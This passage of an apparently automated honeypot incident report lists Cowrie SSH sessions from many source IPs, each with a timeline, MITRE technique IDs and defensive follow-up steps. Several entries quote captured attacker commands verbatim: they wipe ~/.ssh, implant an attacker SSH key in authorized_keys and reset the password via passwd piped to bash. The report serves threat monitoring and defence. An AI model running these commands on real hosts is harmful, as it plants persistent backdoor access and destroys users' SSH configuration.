| **First Seen** | 2026-07-22 07:31 |
| **Last Seen** | 2026-07-22 07:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:31:57` | `cowrie.session.connect` |
| `2026-07-22 07:31:57` | `cowrie.client.version` |
| `2026-07-22 07:31:57` | `cowrie.client.kex` |
| `2026-07-22 07:31:59` | `cowrie.login.success` |
| `2026-07-22 07:32:00` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:32:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.194[.]29` to AbuseIPDB if not already reported
- [ ] Block `49.206.194[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f98d085201ba

| Field | Detail |
|---|---|
| **Source IP** | `112.6.127[.]244` |
| **First Seen** | 2026-07-22 07:33 |
| **Last Seen** | 2026-07-22 07:33 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:33:14` | `cowrie.session.connect` |
| `2026-07-22 07:33:19` | `cowrie.client.version` |
| `2026-07-22 07:33:19` | `cowrie.client.kex` |
| `2026-07-22 07:33:23` | `cowrie.login.success` |
| `2026-07-22 07:33:24` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.6.127[.]244` to AbuseIPDB if not already reported
- [ ] Block `112.6.127[.]244` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-847efdf83200

| Field | Detail |
|---|---|
| **Source IP** | `49.206.201[.]253` |
| **First Seen** | 2026-07-22 07:33 |
| **Last Seen** | 2026-07-22 07:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:33:29` | `cowrie.session.connect` |
| `2026-07-22 07:33:30` | `cowrie.client.version` |
| `2026-07-22 07:33:30` | `cowrie.client.kex` |
| `2026-07-22 07:33:32` | `cowrie.login.success` |
| `2026-07-22 07:33:32` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:33:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.201[.]253` to AbuseIPDB if not already reported
- [ ] Block `49.206.201[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ef327deae1e

| Field | Detail |
|---|---|
| **Source IP** | `94.159.108[.]238` |
| **First Seen** | 2026-07-22 07:39 |
| **Last Seen** | 2026-07-22 07:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:39:26` | `cowrie.session.connect` |
| `2026-07-22 07:39:26` | `cowrie.client.version` |
| `2026-07-22 07:39:26` | `cowrie.client.kex` |
| `2026-07-22 07:39:27` | `cowrie.login.success` |
| `2026-07-22 07:39:28` | `cowrie.session.params` |
| `2026-07-22 07:39:28` | `cowrie.command.input` |
| `2026-07-22 07:39:28` | `cowrie.command.failed` |
| `2026-07-22 07:39:28` | `cowrie.log.closed` |
| `2026-07-22 07:39:29` | `cowrie.session.params` |
| `2026-07-22 07:39:29` | `cowrie.command.input` |
| `2026-07-22 07:39:29` | `cowrie.session.file_download` |
| `2026-07-22 07:39:29` | `cowrie.log.closed` |
| `2026-07-22 07:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.159.108[.]238` to AbuseIPDB if not already reported
- [ ] Block `94.159.108[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41f0e27363cb

| Field | Detail |
|---|---|
| **Source IP** | `94.159.108[.]238` |
| **First Seen** | 2026-07-22 07:39 |
| **Last Seen** | 2026-07-22 07:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:39:29` | `cowrie.session.connect` |
| `2026-07-22 07:39:29` | `cowrie.client.version` |
| `2026-07-22 07:39:29` | `cowrie.client.kex` |
| `2026-07-22 07:39:29` | `cowrie.login.success` |
| `2026-07-22 07:39:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.159.108[.]238` to AbuseIPDB if not already reported
- [ ] Block `94.159.108[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eca6f44cfbcd

| Field | Detail |
|---|---|
| **Source IP** | `94.159.108[.]238` |
| **First Seen** | 2026-07-22 07:39 |
| **Last Seen** | 2026-07-22 07:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:39:29` | `cowrie.session.connect` |
| `2026-07-22 07:39:29` | `cowrie.client.version` |
| `2026-07-22 07:39:29` | `cowrie.client.kex` |
| `2026-07-22 07:39:30` | `cowrie.login.success` |
| `2026-07-22 07:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.159.108[.]238` to AbuseIPDB if not already reported
- [ ] Block `94.159.108[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bdc6def2867

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-22 07:40 |
| **Last Seen** | 2026-07-22 07:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:40:37` | `cowrie.session.connect` |
| `2026-07-22 07:40:37` | `cowrie.client.version` |
| `2026-07-22 07:40:38` | `cowrie.client.kex` |
| `2026-07-22 07:40:38` | `cowrie.login.success` |
| `2026-07-22 07:40:38` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:40:38` | `cowrie.direct-tcpip.ja4` |
| `2026-07-22 07:40:38` | `cowrie.direct-tcpip.data` |
| `2026-07-22 07:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38ca8cbc84b0

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-07-22 07:42 |
| **Last Seen** | 2026-07-22 07:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:42:13` | `cowrie.session.connect` |
| `2026-07-22 07:42:14` | `cowrie.client.version` |
| `2026-07-22 07:42:14` | `cowrie.client.kex` |
| `2026-07-22 07:42:17` | `cowrie.login.success` |
| `2026-07-22 07:42:18` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:42:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a31c7862028a

| Field | Detail |
|---|---|
| **Source IP** | `31.173.0[.]46` |
| **First Seen** | 2026-07-22 07:42 |
| **Last Seen** | 2026-07-22 07:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:42:27` | `cowrie.session.connect` |
| `2026-07-22 07:42:28` | `cowrie.client.version` |
| `2026-07-22 07:42:28` | `cowrie.client.kex` |
| `2026-07-22 07:42:29` | `cowrie.login.success` |
| `2026-07-22 07:42:29` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.0[.]46` to AbuseIPDB if not already reported
- [ ] Block `31.173.0[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-719cc0f4710b

| Field | Detail |
|---|---|
| **Source IP** | `103.210.91[.]5` |
| **First Seen** | 2026-07-22 07:51 |
| **Last Seen** | 2026-07-22 07:52 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "unturned\n9myk9eiKyG4O\n9myk9eiKyG4O"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:51:56` | `cowrie.session.connect` |
| `2026-07-22 07:51:56` | `cowrie.client.version` |
| `2026-07-22 07:51:56` | `cowrie.client.kex` |
| `2026-07-22 07:51:58` | `cowrie.login.success` |
| `2026-07-22 07:51:59` | `cowrie.session.params` |
| `2026-07-22 07:51:59` | `cowrie.command.input` |
| `2026-07-22 07:51:59` | `cowrie.command.failed` |
| `2026-07-22 07:51:59` | `cowrie.log.closed` |
| `2026-07-22 07:52:00` | `cowrie.session.params` |
| `2026-07-22 07:52:00` | `cowrie.command.input` |
| `2026-07-22 07:52:00` | `cowrie.session.file_download` |
| `2026-07-22 07:52:00` | `cowrie.log.closed` |
| `2026-07-22 07:52:02` | `cowrie.session.params` |
| `2026-07-22 07:52:02` | `cowrie.command.input` |
| `2026-07-22 07:52:02` | `cowrie.log.closed` |
| `2026-07-22 07:52:03` | `cowrie.session.params` |
| `2026-07-22 07:52:03` | `cowrie.command.input` |
| `2026-07-22 07:52:03` | `cowrie.command.input` |
| `2026-07-22 07:52:03` | `cowrie.command.failed` |
| `2026-07-22 07:52:04` | `cowrie.log.closed` |
| `2026-07-22 07:52:05` | `cowrie.session.params` |
| `2026-07-22 07:52:05` | `cowrie.command.input` |
| `2026-07-22 07:52:05` | `cowrie.log.closed` |
| `2026-07-22 07:52:06` | `cowrie.session.params` |
| `2026-07-22 07:52:06` | `cowrie.command.input` |
| `2026-07-22 07:52:07` | `cowrie.log.closed` |
| `2026-07-22 07:52:08` | `cowrie.session.params` |
| `2026-07-22 07:52:08` | `cowrie.command.input` |
| `2026-07-22 07:52:08` | `cowrie.log.closed` |
| `2026-07-22 07:52:09` | `cowrie.session.params` |
| `2026-07-22 07:52:09` | `cowrie.command.input` |
| `2026-07-22 07:52:09` | `cowrie.command.input` |
| `2026-07-22 07:52:10` | `cowrie.log.closed` |
| `2026-07-22 07:52:11` | `cowrie.session.params` |
| `2026-07-22 07:52:11` | `cowrie.command.input` |
| `2026-07-22 07:52:11` | `cowrie.log.closed` |
| `2026-07-22 07:52:12` | `cowrie.session.params` |
| `2026-07-22 07:52:12` | `cowrie.command.input` |
| `2026-07-22 07:52:13` | `cowrie.log.closed` |
| `2026-07-22 07:52:14` | `cowrie.session.params` |
| `2026-07-22 07:52:14` | `cowrie.command.input` |
| `2026-07-22 07:52:15` | `cowrie.log.closed` |
| `2026-07-22 07:52:15` | `cowrie.session.params` |
| `2026-07-22 07:52:15` | `cowrie.command.input` |
| `2026-07-22 07:52:16` | `cowrie.log.closed` |
| `2026-07-22 07:52:17` | `cowrie.session.params` |
| `2026-07-22 07:52:17` | `cowrie.command.input` |
| `2026-07-22 07:52:18` | `cowrie.log.closed` |
| `2026-07-22 07:52:19` | `cowrie.session.params` |
| `2026-07-22 07:52:19` | `cowrie.command.input` |
| `2026-07-22 07:52:19` | `cowrie.log.closed` |
| `2026-07-22 07:52:20` | `cowrie.session.params` |
| `2026-07-22 07:52:20` | `cowrie.command.input` |
| `2026-07-22 07:52:21` | `cowrie.log.closed` |
| `2026-07-22 07:52:22` | `cowrie.session.params` |
| `2026-07-22 07:52:22` | `cowrie.command.input` |
| `2026-07-22 07:52:23` | `cowrie.log.closed` |
| `2026-07-22 07:52:24` | `cowrie.session.params` |
| `2026-07-22 07:52:24` | `cowrie.command.input` |
| `2026-07-22 07:52:25` | `cowrie.log.closed` |
| `2026-07-22 07:52:25` | `cowrie.session.params` |
| `2026-07-22 07:52:25` | `cowrie.command.input` |
| `2026-07-22 07:52:26` | `cowrie.log.closed` |
| `2026-07-22 07:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.91[.]5` to AbuseIPDB if not already reported
- [ ] Block `103.210.91[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d2d8c183760

| Field | Detail |
|---|---|
| **Source IP** | `152.32.182[.]41` |
| **First Seen** | 2026-07-22 07:52 |
| **Last Seen** | 2026-07-22 07:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:52:20` | `cowrie.session.connect` |
| `2026-07-22 07:52:20` | `cowrie.client.version` |
| `2026-07-22 07:52:20` | `cowrie.client.kex` |
| `2026-07-22 07:52:20` | `cowrie.login.success` |
| `2026-07-22 07:52:21` | `cowrie.session.params` |
| `2026-07-22 07:52:21` | `cowrie.command.input` |
| `2026-07-22 07:52:21` | `cowrie.command.failed` |
| `2026-07-22 07:52:21` | `cowrie.log.closed` |
| `2026-07-22 07:52:22` | `cowrie.session.params` |
| `2026-07-22 07:52:22` | `cowrie.command.input` |
| `2026-07-22 07:52:22` | `cowrie.session.file_download` |
| `2026-07-22 07:52:22` | `cowrie.log.closed` |
| `2026-07-22 07:52:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.182[.]41` to AbuseIPDB if not already reported
- [ ] Block `152.32.182[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b742ff47e52b

| Field | Detail |
|---|---|
| **Source IP** | `152.32.182[.]41` |
| **First Seen** | 2026-07-22 07:52 |
| **Last Seen** | 2026-07-22 07:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:52:22` | `cowrie.session.connect` |
| `2026-07-22 07:52:22` | `cowrie.client.version` |
| `2026-07-22 07:52:22` | `cowrie.client.kex` |
| `2026-07-22 07:52:22` | `cowrie.login.success` |
| `2026-07-22 07:52:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.182[.]41` to AbuseIPDB if not already reported
- [ ] Block `152.32.182[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e671042a88f

| Field | Detail |
|---|---|
| **Source IP** | `152.32.182[.]41` |
| **First Seen** | 2026-07-22 07:52 |
| **Last Seen** | 2026-07-22 07:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:52:22` | `cowrie.session.connect` |
| `2026-07-22 07:52:22` | `cowrie.client.version` |
| `2026-07-22 07:52:22` | `cowrie.client.kex` |
| `2026-07-22 07:52:22` | `cowrie.login.success` |
| `2026-07-22 07:52:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.182[.]41` to AbuseIPDB if not already reported
- [ ] Block `152.32.182[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11bec574c25f

| Field | Detail |
|---|---|
| **Source IP** | `117.158.166[.]73` |
| **First Seen** | 2026-07-22 07:54 |
| **Last Seen** | 2026-07-22 07:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:54:03` | `cowrie.session.connect` |
| `2026-07-22 07:54:04` | `cowrie.client.version` |
| `2026-07-22 07:54:04` | `cowrie.client.kex` |
| `2026-07-22 07:54:07` | `cowrie.login.success` |
| `2026-07-22 07:54:07` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.158.166[.]73` to AbuseIPDB if not already reported
- [ ] Block `117.158.166[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17eb6046b584

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]52` |
| **First Seen** | 2026-07-22 07:54 |
| **Last Seen** | 2026-07-22 07:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:54:17` | `cowrie.session.connect` |
| `2026-07-22 07:54:18` | `cowrie.client.version` |
| `2026-07-22 07:54:18` | `cowrie.client.kex` |
| `2026-07-22 07:54:21` | `cowrie.login.success` |
| `2026-07-22 07:54:21` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:54:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]52` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c8fc3352f32

| Field | Detail |
|---|---|
| **Source IP** | `211.106.133[.]202` |
| **First Seen** | 2026-07-22 07:54 |
| **Last Seen** | 2026-07-22 07:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:54:18` | `cowrie.session.connect` |
| `2026-07-22 07:54:18` | `cowrie.client.version` |
| `2026-07-22 07:54:19` | `cowrie.client.kex` |
| `2026-07-22 07:54:19` | `cowrie.login.success` |
| `2026-07-22 07:54:20` | `cowrie.session.params` |
| `2026-07-22 07:54:20` | `cowrie.command.input` |
| `2026-07-22 07:54:20` | `cowrie.command.failed` |
| `2026-07-22 07:54:21` | `cowrie.log.closed` |
| `2026-07-22 07:54:21` | `cowrie.session.params` |
| `2026-07-22 07:54:21` | `cowrie.command.input` |
| `2026-07-22 07:54:22` | `cowrie.session.file_download` |
| `2026-07-22 07:54:22` | `cowrie.log.closed` |
| `2026-07-22 07:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.106.133[.]202` to AbuseIPDB if not already reported
- [ ] Block `211.106.133[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b3c946acc26

| Field | Detail |
|---|---|
| **Source IP** | `211.106.133[.]202` |
| **First Seen** | 2026-07-22 07:54 |
| **Last Seen** | 2026-07-22 07:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:54:22` | `cowrie.session.connect` |
| `2026-07-22 07:54:22` | `cowrie.client.version` |
| `2026-07-22 07:54:22` | `cowrie.client.kex` |
| `2026-07-22 07:54:23` | `cowrie.login.success` |
| `2026-07-22 07:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.106.133[.]202` to AbuseIPDB if not already reported
- [ ] Block `211.106.133[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e9175075c26

| Field | Detail |
|---|---|
| **Source IP** | `211.106.133[.]202` |
| **First Seen** | 2026-07-22 07:54 |
| **Last Seen** | 2026-07-22 07:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:54:23` | `cowrie.session.connect` |
| `2026-07-22 07:54:23` | `cowrie.client.version` |
| `2026-07-22 07:54:23` | `cowrie.client.kex` |
| `2026-07-22 07:54:24` | `cowrie.login.success` |
| `2026-07-22 07:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.106.133[.]202` to AbuseIPDB if not already reported
- [ ] Block `211.106.133[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3c1ebca4e42

| Field | Detail |
|---|---|
| **Source IP** | `65.20.205[.]197` |
| **First Seen** | 2026-07-22 07:54 |
| **Last Seen** | 2026-07-22 07:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:54:41` | `cowrie.session.connect` |
| `2026-07-22 07:54:41` | `cowrie.client.version` |
| `2026-07-22 07:54:41` | `cowrie.client.kex` |
| `2026-07-22 07:54:42` | `cowrie.login.success` |
| `2026-07-22 07:54:43` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:54:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.205[.]197` to AbuseIPDB if not already reported
- [ ] Block `65.20.205[.]197` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5257a891688

| Field | Detail |
|---|---|
| **Source IP** | `112.25.140[.]211` |
| **First Seen** | 2026-07-22 07:54 |
| **Last Seen** | 2026-07-22 07:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
